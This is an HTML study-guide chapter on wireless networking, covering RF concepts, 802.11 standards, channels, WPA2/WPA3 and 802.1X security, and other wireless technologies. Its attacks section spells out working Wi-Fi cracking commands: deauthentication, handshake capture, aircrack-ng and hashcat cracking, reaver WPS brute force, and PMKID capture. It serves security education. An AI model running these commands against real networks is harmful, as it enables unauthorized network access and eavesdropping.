@@ -1,0 +1,555 @@
+<html><head><style>body {
+   color: black;
+}
+</style></head><body><h1 id="section-6-wireless-networking">SECTION 6: Wireless Networking</h1>
+<hr>
+<h2 id="6-1-wireless-fundamentals">6.1 Wireless Fundamentals</h2>
+<p>Wireless networking transmits data using <strong>radio frequency (RF)</strong> signals instead of physical cables. RF signals propagate through air (and other media) as electromagnetic waves.</p>
+<h3 id="key-rf-concepts">Key RF Concepts</h3>
+<p><strong>Frequency:</strong> Number of cycles per second (Hz). Higher frequency = more data capacity but shorter range.</p>
+<p><strong>Wavelength:</strong> Physical length of one cycle. Wavelength = Speed of light / Frequency. Lower frequency = longer wavelength = better penetration through walls.</p>
+<p><strong>Amplitude:</strong> Signal strength. Measured in decibels (dB).</p>
+<p><strong>dB (Decibel) math:</strong></p>
+<ul>
+<li>+3 dB = double the power</li>
+<li>-3 dB = half the power</li>
+<li>+10 dB = 10× the power</li>
+<li>-10 dB = 1/10th the power</li>
+<li>0 dBm = 1 milliwatt reference</li>
+</ul>
+<p><strong>dBm:</strong> Power relative to 1 milliwatt</p>
+<ul>
+<li>Typical AP transmit power: 20 dBm (100 mW)</li>
+<li>Typical receive sensitivity: -70 to -90 dBm</li>
+</ul>
+<p><strong>RSSI (Received Signal Strength Indicator):</strong> Measured in negative dBm</p>
+<ul>
+<li>-30 dBm: Excellent (very close to AP)</li>
+<li>-50 dBm: Great</li>
+<li>-60 dBm: Good</li>
+<li>-70 dBm: Fair (minimum for reliable connection)</li>
+<li>-80 dBm: Poor (streaming problems)</li>
+<li>-90 dBm: Unusable</li>
+</ul>
+<p><strong>SNR (Signal-to-Noise Ratio):</strong> Difference between signal and noise floor</p>
+<ul>
+<li><blockquote>
+<p>40 dB: Excellent</p>
+</blockquote>
+</li>
+<li>25-40 dB: Good</li>
+<li>15-25 dB: Low — may cause issues</li>
+<li>&lt; 15 dB: Very poor</li>
+</ul>
+<h3 id="wireless-signal-issues">Wireless Signal Issues</h3>
+<p><strong>Attenuation:</strong> Signal weakens with distance (free space path loss).</p>
+<p><strong>Interference:</strong> Other RF sources degrading signal:</p>
+<ul>
+<li>Other 2.4 GHz devices: microwaves, Bluetooth, cordless phones</li>
+<li>Adjacent channel interference (overlapping Wi-Fi channels)</li>
+<li>Co-channel interference (same channel, different AP)</li>
+</ul>
+<p><strong>Multipath:</strong> Signal reflects off walls/objects and arrives at receiver at different times.</p>
+<ul>
+<li>Can cause signal cancellation (destructive interference) or amplification</li>
+<li>MIMO uses multipath beneficially</li>
+</ul>
+<p><strong>Hidden node problem:</strong> Two stations can&#39;t hear each other but both transmit to same AP → collisions. Solved by RTS/CTS.</p>
+<p><strong>Near/far problem:</strong> Nearby device drowns out signal from distant device.</p>
+<p><strong>Absorption:</strong> Materials absorb RF energy:</p>
+<ul>
+<li>Concrete/brick: High absorption</li>
+<li>Drywall: Low absorption</li>
+<li>Metal: Reflects (worst — creates dead zones)</li>
+<li>Water (humans, aquariums): High absorption</li>
+<li>Glass: Low absorption</li>
+</ul>
+<hr>
+<h2 id="6-2-wi-fi-standards-ieee-802-11-">6.2 Wi-Fi Standards (IEEE 802.11)</h2>
+<h3 id="ieee-802-11-standards-comparison">IEEE 802.11 Standards Comparison</h3>
+<table>
+<thead>
+<tr>
+<th>Standard</th>
+<th>Wi-Fi Gen</th>
+<th>Year</th>
+<th>Max Speed</th>
+<th>Frequency</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>802.11</td>
+<td>—</td>
+<td>1997</td>
+<td>2 Mbps</td>
+<td>2.4 GHz</td>
+<td>Original</td>
+</tr>
+<tr>
+<td>802.11a</td>
+<td>—</td>
+<td>1999</td>
+<td>54 Mbps</td>
+<td>5 GHz</td>
+<td>OFDM; short range</td>
+</tr>
+<tr>
+<td>802.11b</td>
+<td>—</td>
+<td>1999</td>
+<td>11 Mbps</td>
+<td>2.4 GHz</td>
+<td>DSSS; popular but slow</td>
+</tr>
+<tr>
+<td>802.11g</td>
+<td>—</td>
+<td>2003</td>
+<td>54 Mbps</td>
+<td>2.4 GHz</td>
+<td>OFDM; backward compatible</td>
+</tr>
+<tr>
+<td>802.11n</td>
+<td>Wi-Fi 4</td>
+<td>2009</td>
+<td>600 Mbps</td>
+<td>2.4/5 GHz</td>
+<td>MIMO; channel bonding</td>
+</tr>
+<tr>
+<td>802.11ac</td>
+<td>Wi-Fi 5</td>
+<td>2013</td>
+<td>3.5 Gbps</td>
+<td>5 GHz only</td>
+<td>MU-MIMO; 160 MHz channels</td>
+</tr>
+<tr>
+<td>802.11ax</td>
+<td>Wi-Fi 6</td>
+<td>2019</td>
+<td>9.6 Gbps</td>
+<td>2.4/5 GHz</td>
+<td>OFDMA; BSS Coloring; TWT</td>
+</tr>
+<tr>
+<td>802.11ax</td>
+<td>Wi-Fi 6E</td>
+<td>2021</td>
+<td>9.6 Gbps</td>
+<td>2.4/5/6 GHz</td>
+<td>Adds 6 GHz band</td>
+</tr>
+<tr>
+<td>802.11be</td>
+<td>Wi-Fi 7</td>
+<td>2024</td>
+<td>46 Gbps</td>
+<td>2.4/5/6 GHz</td>
+<td>Multi-link; 320 MHz</td>
+</tr>
+</tbody>
+</table>
+<h3 id="modulation-and-encoding-techniques">Modulation and Encoding Techniques</h3>
+<p><strong>DSSS (Direct Sequence Spread Spectrum):</strong> Used by 802.11b. Spreads signal over wider band.</p>
+<p><strong>OFDM (Orthogonal Frequency Division Multiplexing):</strong> Used by 802.11a/g/n/ac. Splits channel into many subcarriers — efficient, handles multipath well.</p>
+<p><strong>OFDMA (Orthogonal Frequency Division Multiple Access):</strong> Used by 802.11ax (Wi-Fi 6). Multiple users share subcarriers simultaneously — better efficiency in dense environments.</p>
+<p><strong>MIMO (Multiple Input Multiple Output):</strong> Multiple antennas for transmit and receive — improves throughput and reliability using multipath.</p>
+<ul>
+<li>802.11n: Up to 4×4 MIMO</li>
+<li>802.11ac: MU-MIMO (downlink only) up to 4 clients</li>
+<li>802.11ax: MU-MIMO (uplink and downlink) up to 8 clients</li>
+</ul>
+<p><strong>MRC (Maximal Ratio Combining):</strong> Receiver combines multipath signals constructively.</p>
+<p><strong>Beamforming:</strong> Focus RF energy toward specific client rather than radiating equally in all directions.</p>
+<h3 id="wireless-channels">Wireless Channels</h3>
+<h4 id="2-4-ghz-band">2.4 GHz Band</h4>
+<ul>
+<li>Channels 1–14 (region-dependent; US = 1–11)</li>
+<li>Each channel is 22 MHz wide; 5 MHz separation between channels</li>
+<li><strong>Non-overlapping channels (US): 1, 6, 11</strong></li>
+<li>Only 3 non-overlapping channels — congested in dense areas</li>
+</ul>
+<pre><code>Ch 1:  |<span class="hljs-string">----</span>|
+Ch 6:       |<span class="hljs-string">----</span>|
+Ch 11:           |<span class="hljs-string">----</span>|
+</code></pre><h4 id="5-ghz-band">5 GHz Band</h4>
+<ul>
+<li>24+ non-overlapping 20 MHz channels (US)</li>
+<li>Channels: 36, 40, 44, 48 (UNII-1), 52, 56, 60, 64 (UNII-2), 100–144 (UNII-2e), 149–165 (UNII-3)</li>
+<li>More channels = less congestion</li>
+<li><strong>DFS (Dynamic Frequency Selection):</strong> Required on channels 52–144 — must detect radar and switch channels</li>
+<li><strong>TPC (Transmit Power Control):</strong> Adjust power to avoid interference with radar</li>
+</ul>
+<h4 id="6-ghz-band-wi-fi-6e-">6 GHz Band (Wi-Fi 6E)</h4>
+<ul>
+<li>59 additional 20 MHz channels</li>
+<li>No legacy devices (Wi-Fi 6E only)</li>
+<li>No DFS required</li>
+<li>Less interference; more capacity</li>
+</ul>
+<h4 id="channel-bonding">Channel Bonding</h4>
+<p>Combine adjacent channels for higher throughput:</p>
+<ul>
+<li><strong>40 MHz:</strong> Bonds 2×20 MHz channels (doubles throughput; primary + secondary channel)</li>
+<li><strong>80 MHz:</strong> Bonds 4×20 MHz (802.11ac and later)</li>
+<li><strong>160 MHz:</strong> Bonds 8×20 MHz (802.11ac Wave 2, 802.11ax)</li>
+<li>Wider channels = higher throughput but more interference risk</li>
+</ul>
+<h3 id="2-4-ghz-vs-5-ghz-vs-6-ghz">2.4 GHz vs 5 GHz vs 6 GHz</h3>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>2.4 GHz</th>
+<th>5 GHz</th>
+<th>6 GHz</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Range</td>
+<td>Longer</td>
+<td>Shorter</td>
+<td>Shorter</td>
+</tr>
+<tr>
+<td>Wall penetration</td>
+<td>Better</td>
+<td>Worse</td>
+<td>Worse</td>
+</tr>
+<tr>
+<td>Congestion</td>
+<td>High</td>
+<td>Lower</td>
+<td>Very low (new)</td>
+</tr>
+<tr>
+<td>Non-overlapping channels</td>
+<td>3</td>
+<td>24+</td>
+<td>59+</td>
+</tr>
+<tr>
+<td>Max speed (theoretical)</td>
+<td>600 Mbps</td>
+<td>9.6 Gbps</td>
+<td>9.6 Gbps</td>
+</tr>
+<tr>
+<td>Backward compatibility</td>
+<td>All devices</td>
+<td>n/a</td>
+<td>Wi-Fi 6E only</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="6-3-wireless-topologies-and-modes">6.3 Wireless Topologies and Modes</h2>
+<h3 id="bss-basic-service-set-">BSS (Basic Service Set)</h3>
+<ul>
+<li>Single AP + clients</li>
+<li><strong>BSSID:</strong> AP&#39;s MAC address (identifies the BSS)</li>
+<li><strong>SSID:</strong> Service Set Identifier — the network name</li>
+</ul>
+<h3 id="ess-extended-service-set-">ESS (Extended Service Set)</h3>
+<ul>
+<li>Multiple APs with <strong>same SSID</strong> — roaming network</li>
+<li>Each AP has unique BSSID but same SSID</li>
+<li><strong>Roaming:</strong> Client moves between APs seamlessly</li>
+<li><strong>Fast BSS Transition (802.11r):</strong> Speeds up roaming</li>
+<li><strong>802.11k:</strong> Radio Resource Management — clients can find better APs</li>
+<li><strong>802.11v:</strong> BSS Transition Management — AP can suggest clients move</li>
+</ul>
+<h3 id="ibss-ad-hoc">IBSS / Ad-hoc</h3>
+<ul>
+<li>No AP — peer-to-peer wireless</li>
+<li>Limited range and performance</li>
+<li>Used for: temporary networks, direct file transfer</li>
+</ul>
+<h3 id="mesh-networking">Mesh Networking</h3>
+<ul>
+<li>APs communicate wirelessly to each other (backhaul)</li>
+<li>One or more APs connect to wired network (root/gateway AP)</li>
+<li>Self-configuring, self-healing</li>
+<li>Used in: homes (Eero, Google Nest), outdoor coverage areas</li>
+</ul>
+<h3 id="wireless-bridge">Wireless Bridge</h3>
+<ul>
+<li>Connect two wired network segments wirelessly</li>
+<li>Point-to-point: Two APs in bridge mode</li>
+<li>Point-to-multipoint: One root bridge, multiple non-root bridges</li>
+</ul>
+<hr>
+<h2 id="6-4-wireless-security">6.4 Wireless Security</h2>
+<h3 id="historical-security-do-not-use-">Historical Security (DO NOT USE)</h3>
+<p><strong>WEP (Wired Equivalent Privacy):</strong></p>
+<ul>
+<li>Uses RC4 stream cipher with 40-bit or 104-bit key</li>
+<li>Critically flawed — IV (Initialization Vector) only 24 bits, reused frequently</li>
+<li>Can be cracked in minutes with tools like aircrack-ng</li>
+<li><strong>AVOID</strong> — completely broken</li>
+</ul>
+<p><strong>WPA (Wi-Fi Protected Access):</strong></p>
+<ul>
+<li>Introduced as interim fix for WEP</li>
+<li>Uses <strong>TKIP (Temporal Key Integrity Protocol)</strong> — still RC4 but with per-packet key mixing</li>
+<li>Better than WEP but TKIP also has weaknesses</li>
+<li><strong>AVOID</strong> — deprecated</li>
+</ul>
+<h3 id="current-security-standards">Current Security Standards</h3>
+<p><strong>WPA2 (802.11i) — Current minimum standard:</strong></p>
+<ul>
+<li>Uses <strong>CCMP (Counter Mode with CBC-MAC Protocol)</strong> — AES-128</li>
+<li>Much stronger than WPA/TKIP</li>
+<li>Two modes:<ul>
+<li><strong>Personal (PSK):</strong> Pre-Shared Key — passphrase hashed with SSID</li>
+<li><strong>Enterprise (802.1X):</strong> RADIUS server authentication</li>
+</ul>
+</li>
+</ul>
+<p><strong>WPA3 — Current recommended standard:</strong></p>
+<ul>
+<li>Mandatory for Wi-Fi 6 (802.11ax) certification</li>
+<li><strong>SAE (Simultaneous Authentication of Equals):</strong> Replaces PSK — prevents offline dictionary attacks<ul>
+<li>Forward secrecy — old sessions can&#39;t be decrypted even if password is compromised</li>
+</ul>
+</li>
+<li><strong>192-bit security mode:</strong> For enterprise/government</li>
+<li><strong>OWE (Opportunistic Wireless Encryption):</strong> Encrypts open networks (no password but encrypted)</li>
+<li><strong>Easy Connect (DPP):</strong> QR code device provisioning for IoT</li>
+</ul>
+<h3 id="802-1x-eap-enterprise-authentication">802.1X / EAP — Enterprise Authentication</h3>
+<p><strong>802.1X:</strong> Port-based Network Access Control (PNAC)</p>
+<ul>
+<li>Three components:<ul>
+<li><strong>Supplicant:</strong> Client device seeking access</li>
+<li><strong>Authenticator:</strong> AP or switch (forwards credentials)</li>
+<li><strong>Authentication Server:</strong> RADIUS server (validates credentials)</li>
+</ul>
+</li>
+</ul>
+<p><strong>EAP (Extensible Authentication Protocol):</strong> Authentication framework used within 802.1X</p>
+<table>
+<thead>
+<tr>
+<th>EAP Method</th>
+<th>Client Certificate</th>
+<th>Server Certificate</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>EAP-TLS</td>
+<td>Required</td>
+<td>Required</td>
+<td>Most secure; requires client cert PKI</td>
+</tr>
+<tr>
+<td>PEAP</td>
+<td>Not required</td>
+<td>Required</td>
+<td>Password inside TLS tunnel</td>
+</tr>
+<tr>
+<td>EAP-TTLS</td>
+<td>Not required</td>
+<td>Required</td>
+<td>Like PEAP but more flexible</td>
+</tr>
+<tr>
+<td>EAP-FAST</td>
+<td>Not required</td>
+<td>Optional</td>
+<td>Cisco; PAC-based</td>
+</tr>
+<tr>
+<td>LEAP</td>
+<td>Not required</td>
+<td>Not required</td>
+<td>Cisco; broken — avoid</td>
+</tr>
+<tr>
+<td>EAP-MD5</td>
+<td>Not required</td>
+<td>Not required</td>
+<td>No encryption; avoid</td>
+</tr>
+</tbody>
+</table>
+<p><strong>RADIUS for Wi-Fi:</strong></p>
+<ul>
+<li>AP sends auth request to RADIUS server (UDP 1812/1813)</li>
+<li>RADIUS validates credentials (against AD, LDAP, local DB)</li>
+<li>RADIUS sends Access-Accept or Access-Reject</li>
+<li><strong>802.1X four-way handshake</strong> then establishes encryption keys</li>
+</ul>
+<h3 id="four-way-handshake-wpa2-wpa3-">Four-Way Handshake (WPA2/WPA3)</h3>
+<p>After 802.1X or PSK authentication, the <strong>four-way handshake</strong> establishes encryption keys:</p>
+<pre><code>AP                              Client
+ |<span class="hljs-type">--- EAPOL</span> Key (ANonce) --------&gt;|   <span class="hljs-type">AP</span> sends random nonce
+ |<span class="hljs-type">&lt;-- EAPOL</span> Key (SNonce, MIC) ----|   <span class="hljs-type">Client</span> sends nonce + MIC
+ |<span class="hljs-type">--- EAPOL</span> Key (GTK, MIC) ------&gt;|   <span class="hljs-type">AP</span> sends Group Temporal Key
+ |<span class="hljs-type">&lt;-- EAPOL</span> Key (ACK) ------------|   <span class="hljs-type">Client</span> acknowledges
+
+Keys derived:
+PTK (Pairwise Temporal Key) = PRF(PMK + ANonce + SNonce + AP-MAC + Client-MAC)
+</code></pre><p><strong>Key hierarchy:</strong></p>
+<ul>
+<li><strong>PSK/PMK (Pairwise Master Key):</strong> Derived from passphrase or 802.1X</li>
+<li><strong>PTK (Pairwise Temporal Key):</strong> Per-session unicast encryption key</li>
+<li><strong>GTK (Group Temporal Key):</strong> Multicast/broadcast encryption key</li>
+</ul>
+<hr>
+<h2 id="6-5-wireless-attacks">6.5 Wireless Attacks</h2>
+<h3 id="passive-attacks-eavesdropping-">Passive Attacks (Eavesdropping)</h3>
+<ul>
+<li><strong>Packet sniffing:</strong> Use monitor mode NIC + Wireshark/tcpdump</li>
+<li>Monitor mode captures all 802.11 frames (data, management, control)</li>
+<li><strong>Evil twin / Rogue AP:</strong> Create fake AP with same SSID — clients connect thinking it&#39;s legitimate</li>
+</ul>
+<h3 id="active-attacks">Active Attacks</h3>
+<p><strong>Deauthentication Attack:</strong></p>
+<ul>
+<li>802.11 management frames not authenticated in WPA2</li>
+<li>Send forged deauth frames (spoofing AP MAC) → clients disconnect</li>
+<li>Force reauthentication → capture 4-way handshake for offline cracking<pre><code class="lang-bash">aireplay-ng --deauth 10 -a [<span class="hljs-keyword">AP</span>-<span class="hljs-keyword">MAC</span>] -c [Client-<span class="hljs-keyword">MAC</span>] wlan0mon
+</code></pre>
+</li>
+</ul>
+<p><strong>WPA2 Handshake Capture + Offline Crack:</strong></p>
+<pre><code class="lang-bash"><span class="hljs-selector-tag">airmon-ng</span> <span class="hljs-selector-tag">start</span> <span class="hljs-selector-tag">wlan0</span>                              # <span class="hljs-selector-tag">Enable</span> <span class="hljs-selector-tag">monitor</span> <span class="hljs-selector-tag">mode</span>
+<span class="hljs-selector-tag">airodump-ng</span> <span class="hljs-selector-tag">wlan0mon</span>                               # <span class="hljs-selector-tag">Scan</span> <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">networks</span>
+<span class="hljs-selector-tag">airodump-ng</span> <span class="hljs-selector-tag">-c</span> 6 <span class="hljs-selector-tag">--bssid</span> <span class="hljs-selector-tag">AA</span><span class="hljs-selector-pseudo">:BB</span><span class="hljs-selector-pseudo">:CC</span><span class="hljs-selector-pseudo">:DD</span><span class="hljs-selector-pseudo">:EE</span><span class="hljs-selector-pseudo">:FF</span> <span class="hljs-selector-tag">-w</span> <span class="hljs-selector-tag">capture</span> <span class="hljs-selector-tag">wlan0mon</span>  # <span class="hljs-selector-tag">Capture</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">channel</span> 6
+<span class="hljs-selector-tag">aireplay-ng</span> <span class="hljs-selector-tag">--deauth</span> 5 <span class="hljs-selector-tag">-a</span> <span class="hljs-selector-tag">AA</span><span class="hljs-selector-pseudo">:BB</span><span class="hljs-selector-pseudo">:CC</span><span class="hljs-selector-pseudo">:DD</span><span class="hljs-selector-pseudo">:EE</span><span class="hljs-selector-pseudo">:FF</span> <span class="hljs-selector-tag">wlan0mon</span>  # <span class="hljs-selector-tag">Deauth</span> <span class="hljs-selector-tag">clients</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">capture</span> <span class="hljs-selector-tag">handshake</span>
+<span class="hljs-selector-tag">aircrack-ng</span> <span class="hljs-selector-tag">-w</span> <span class="hljs-selector-tag">rockyou</span><span class="hljs-selector-class">.txt</span> <span class="hljs-selector-tag">capture</span>*<span class="hljs-selector-class">.cap</span>           # <span class="hljs-selector-tag">Crack</span> <span class="hljs-selector-tag">offline</span>
+<span class="hljs-selector-tag">hashcat</span> <span class="hljs-selector-tag">-m</span> 22000 <span class="hljs-selector-tag">capture</span><span class="hljs-selector-class">.hccapx</span> <span class="hljs-selector-tag">rockyou</span><span class="hljs-selector-class">.txt</span>       # <span class="hljs-selector-tag">GPU</span> <span class="hljs-selector-tag">crack</span>
+</code></pre>
+<p><strong>WPS Attacks:</strong></p>
+<ul>
+<li>WPS PIN is 8 digits → effectively 11,000 combinations (split auth allows 10^4 + 10^3 tests)</li>
+<li>Pixie dust attack exploits weak WPS implementations</li>
+<li><strong>Reaver:</strong> WPS PIN brute force tool<pre><code class="lang-bash"><span class="hljs-selector-tag">reaver</span> <span class="hljs-selector-tag">-i</span> <span class="hljs-selector-tag">wlan0mon</span> <span class="hljs-selector-tag">-b</span> <span class="hljs-selector-tag">AA</span><span class="hljs-selector-pseudo">:BB</span><span class="hljs-selector-pseudo">:CC</span><span class="hljs-selector-pseudo">:DD</span><span class="hljs-selector-pseudo">:EE</span><span class="hljs-selector-pseudo">:FF</span> <span class="hljs-selector-tag">-vv</span>
+</code></pre>
+</li>
+</ul>
+<p><strong>PMKID Attack (hashcat-new, no deauth needed):</strong></p>
+<ul>
+<li>Extract PMKID from first EAPOL frame (no full handshake needed)<pre><code class="lang-bash">hcxdumptool -<span class="hljs-selector-tag">i</span> wlan0mon -o output<span class="hljs-selector-class">.pcapng</span> --enable_status=<span class="hljs-number">1</span>
+hcxpcapngtool output<span class="hljs-selector-class">.pcapng</span> -o hashes<span class="hljs-selector-class">.txt</span>
+hashcat -m <span class="hljs-number">22000</span> hashes<span class="hljs-selector-class">.txt</span> wordlist.txt
+</code></pre>
+</li>
+</ul>
+<p><strong>Evil Twin / Karma Attack:</strong></p>
+<ul>
+<li>Create AP with same SSID as legitimate network</li>
+<li>Clients auto-connect if signal is stronger</li>
+<li>Tools: hostapd-wpe, airbase-ng, WiFi Pineapple</li>
+</ul>
+<p><strong>Wardriving:</strong></p>
+<ul>
+<li>Driving with wireless adapter scanning for networks</li>
+<li>Tools: Kismet, WiGLE, NetStumbler (legacy)</li>
+</ul>
+<hr>
+<h2 id="6-6-wireless-infrastructure-configuration">6.6 Wireless Infrastructure Configuration</h2>
+<h3 id="cisco-wireless-lan-controller-wlc-">Cisco Wireless LAN Controller (WLC)</h3>
+<pre><code>WLC concepts:
+-<span class="ruby"> LAP (Lightweight AP): Controlled by WLC
+</span>-<span class="ruby"> <span class="hljs-symbol">CAPWAP:</span> Control And Provisioning of Wireless Access Points
+</span>  -<span class="ruby"> UDP <span class="hljs-number">5246</span>: CAPWAP control channel
+</span>  -<span class="ruby"> UDP <span class="hljs-number">5247</span>: CAPWAP data channel
+</span>-<span class="ruby"> <span class="hljs-symbol">FlexConnect:</span> LAP operates independently <span class="hljs-keyword">if</span> WLC connection lost
+</span>-<span class="ruby"> Local <span class="hljs-symbol">mode:</span> All traffic tunneled to WLC</span>
+</code></pre><h3 id="wireless-network-design">Wireless Network Design</h3>
+<p><strong>Channel planning (2.4 GHz):</strong></p>
+<ul>
+<li>Assign channels 1, 6, 11 to adjacent APs</li>
+<li>No adjacent APs on overlapping channels</li>
+</ul>
+<p><strong>Cell sizing:</strong></p>
+<ul>
+<li>Overlap of 15-20% between cells for seamless roaming</li>
+<li>Reduce power to prevent too much overlap</li>
+</ul>
+<p><strong>AP placement:</strong></p>
+<ul>
+<li>Mount high (ceiling preferred)</li>
+<li>Away from metal objects and microwaves</li>
+<li>Consider building materials</li>
+</ul>
+<p><strong>High-density environments:</strong></p>
+<ul>
+<li>More APs with lower power (smaller cells)</li>
+<li>Use 5 GHz primarily (more channels)</li>
+<li>Enable BSS coloring (802.11ax) to reuse channels</li>
+</ul>
+<hr>
+<h2 id="6-7-other-wireless-technologies">6.7 Other Wireless Technologies</h2>
+<h3 id="bluetooth-ieee-802-15-1-">Bluetooth (IEEE 802.15.1)</h3>
+<ul>
+<li>Short range (~10m, Class 2; up to 100m, Class 1)</li>
+<li>2.4 GHz band — 79 channels, 1 MHz each</li>
+<li>Uses <strong>FHSS (Frequency Hopping Spread Spectrum)</strong> — 1600 hops/second</li>
+<li><strong>Versions:</strong><ul>
+<li>Bluetooth 4.0/BLE: Low Energy — IoT, beacons</li>
+<li>Bluetooth 5.0: 2× speed, 4× range of BLE, 8× broadcast capacity</li>
+</ul>
+</li>
+<li><strong>Piconet:</strong> One master, up to 7 active slaves</li>
+<li><strong>Scatternet:</strong> Overlapping piconets</li>
+</ul>
+<p><strong>Bluetooth attacks:</strong></p>
+<ul>
+<li><strong>Bluejacking:</strong> Send unsolicited messages to Bluetooth devices</li>
+<li><strong>Bluesnarfing:</strong> Unauthorized access to data (contacts, calendar) — exploits OBEX</li>
+<li><strong>Bluebugging:</strong> Take control of device (calls, messages)</li>
+<li><strong>BlueBorne:</strong> Attack via Bluetooth without pairing (RCE, MITM)</li>
+</ul>
+<h3 id="nfc-near-field-communication-">NFC (Near Field Communication)</h3>
+<ul>
+<li>Extremely short range (&lt; 4 cm)</li>
+<li>13.56 MHz</li>
+<li>106–424 Kbps</li>
+<li>Uses: contactless payment, transit cards, smart tags</li>
+<li><strong>NFC attacks:</strong> Eavesdropping (possible at short distance), relay attacks</li>
+</ul>
+<h3 id="zigbee-ieee-802-15-4-">Zigbee (IEEE 802.15.4)</h3>
+<ul>
+<li>Low-power, low-data-rate mesh network</li>
+<li>2.4 GHz (16 channels) or 868/915 MHz</li>
+<li>Range: 10–100m per hop; mesh extends range</li>
+<li>Used for: smart home (lights, thermostats, sensors), industrial IoT</li>
+</ul>
+<h3 id="z-wave">Z-Wave</h3>
+<ul>
+<li>Similar to Zigbee — home automation</li>
+<li>908.42 MHz (US) — less interference than 2.4 GHz</li>
+<li>Range: ~30m per hop; mesh</li>
+</ul>
+<h3 id="wimax-ieee-802-16-">WiMAX (IEEE 802.16)</h3>
+<ul>
+<li>Broadband wireless for wide-area (MAN/WAN)</li>
+<li>Range: Up to 50 km</li>
+<li>Up to 70 Mbps</li>
+<li>Largely replaced by LTE</li>
+</ul>
+<h3 id="cellular-networks">Cellular Networks</h3>
+<ul>
+<li><strong>LTE (Long-Term Evolution) / 4G:</strong> 100 Mbps+ downlink; uses OFDMA</li>
+<li><strong>LTE-A (LTE-Advanced):</strong> Carrier aggregation; 1 Gbps+</li>
+<li><strong>5G NR (New Radio):</strong> Sub-6 GHz and mmWave (24+ GHz)<ul>
+<li><strong>Sub-6 GHz:</strong> Similar range to LTE; 1–10 Gbps</li>
+<li><strong>mmWave (FR2):</strong> Extremely high speed (up to 20 Gbps) but very short range (&lt;300m), blocked by buildings</li>
+</ul>
+</li>
+<li><strong>CBRS (Citizens Broadband Radio Service):</strong> 3.5 GHz private LTE for enterprise</li>
+</ul>
+<hr>
+</body></html>
